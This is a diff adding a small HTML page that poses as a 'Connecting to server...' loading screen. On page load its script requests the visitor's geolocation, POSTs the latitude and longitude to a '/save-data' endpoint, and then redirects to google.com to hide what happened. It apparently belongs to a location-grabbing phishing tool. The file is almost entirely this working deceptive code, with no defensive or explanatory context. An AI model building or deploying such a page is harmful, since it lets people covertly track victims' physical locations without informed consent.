@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+    <script>
+        window.onload = function() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    fetch('/save-data', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude
+                        })
+                    }).then(() => {
+                        window.location.href = "https://www.google.com";
+                    });
+                });
+            }
+        }
+    </script>
+    <h2>Connecting to server...</h2>
+</body>
+</html>
